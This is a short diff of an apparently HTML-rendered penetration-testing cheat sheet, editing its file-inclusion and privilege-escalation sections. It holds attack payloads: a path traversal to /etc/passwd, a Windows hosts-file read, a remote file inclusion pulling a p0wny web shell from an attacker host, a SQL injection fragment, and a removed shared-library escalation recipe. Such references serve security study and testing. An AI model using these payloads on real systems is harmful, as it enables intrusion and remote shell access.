@@ -286,8 +286,7 @@ admin<span class="hljs-string">') or ('</span><span class="hljs-number">1</span>
 <ul>
 <li><p>Linux Path<br><code>../../../../../../../../etc/passwd</code></p>
 </li>
-<li><p><a href="https://github.com/seal9055/Docs/blob/main/windows_lfi">Windows LFI</a><br><code>c:\windows\system32\drivers\etc\hosts</code></p>
-</li>
+<li><p>Windows LFI<br><code>c:\windows\system32\drivers\etc\hosts</code></p>
 <li><p>RFI<br><code>http://&lt;LHOST:80&gt;/p0wny_shell.php</code></p>
 </li>
 <li><p>Wordlists  </p>
@@ -435,11 +434,6 @@ echo <span class="hljs-string">"<span class="hljs-keyword">GET</span> /&lt;file&
 <ul>
 <li><p><a href="https://gtfobins.github.io">gtfobins</a>  </p>
 </li>
-<li><p>Check For Writeable Shared Files (<a href="https://github.com/seal9055/Docs/blob/main/suid.c">Shell</a>)  </p>
-<pre><code>strace &lt;service&gt; <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep -iE <span class="hljs-string">"open|access|no such file"</span>
-<span class="hljs-keyword">create</span> &amp; <span class="hljs-keyword">compile</span> the above linked <span class="hljs-built_in">shell</span>
-Execute Service
-</code></pre></li>
 <li><p>Incomplete Path  </p>
 <pre><code> <span class="hljs-keyword">strings </span>&lt;service&gt;  
 <span class="hljs-keyword">strace </span>-v -f -e execve &lt;service&gt; <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>    
